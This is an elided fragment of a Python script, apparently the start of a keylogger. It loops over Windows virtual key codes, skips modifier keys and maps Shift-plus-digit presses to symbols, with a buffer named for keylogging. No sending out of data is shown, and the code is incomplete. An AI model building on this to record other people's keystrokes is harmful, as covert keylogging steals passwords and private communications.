# -*- coding: utf-8 -*-
"""
Created on Sun Mar 18 15:19:18 2018
...
result = ''
SaveDirs = []
SaveDirs.append(os.getcwd())
MAX_KEYLOGGER_BUF = 1024


while True:
    for code in range(8,256) :  
        if code in [VK_SHIFT,VK_MENU,VK_CONTROL,VK_CAPITAL,VK_NUMLOCK] : continue 
        ...
        #### Right kryboard and else symbol 
        ...
        #### Number 
        if VK_0 <= code <= VK_9 and 'Shift' in Modifier:
            name = symbol[int(keymap.get(code))]
